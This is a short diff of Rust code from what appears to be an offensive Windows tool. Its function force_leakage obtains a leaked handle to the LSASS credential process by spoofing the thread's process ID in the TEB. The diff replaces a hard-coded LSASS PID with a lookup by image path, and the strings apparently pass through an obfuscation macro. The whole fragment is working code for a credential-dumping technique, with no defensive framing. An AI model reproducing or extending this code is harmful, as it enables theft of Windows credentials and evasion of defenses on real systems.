@@ -542,7 +542,7 @@ pub fn force_leakage()
         // 997 = ERROR_IO_PENDING
         if get_last_error_r.unwrap() != 997
         {
-            println!("{}",&lc!("[x] Lsass handle forced leakage failed."));
+            println!("{}",&lc!("[x] Lsass handle leakage failed."));
             return;
         }
 
@@ -582,9 +582,9 @@ pub fn force_leakage()
                 }     
            
                 let teb: *mut ntapi::ntpebteb::TEB = std::mem::transmute((*tbi).teb_base_address);
-                let spoofed = 764isize; //CLIENT_ID {UniqueProcess : lsass_pid, UniqueThread: (*tbi).client_id.UniqueThread};
+                let spoofed_pid = get_pid_from_image_path(&lc!("C:\\Windows\\system32\\lsass.exe")) as isize;
                 let dst_ptr: *mut CLIENT_ID  = std::mem::transmute(&(*teb).ClientId);
-                let spoofed_pid = CLIENT_ID {UniqueProcess:HANDLE {0: spoofed}, UniqueThread: (*tbi).client_id.UniqueThread};
+                let spoofed_pid = CLIENT_ID {UniqueProcess:HANDLE {0: spoofed_pid}, UniqueThread: (*tbi).client_id.UniqueThread};
                 let src_ptr: *mut CLIENT_ID = std::mem::transmute(&spoofed_pid);
 
                 // TEB pid spoofing
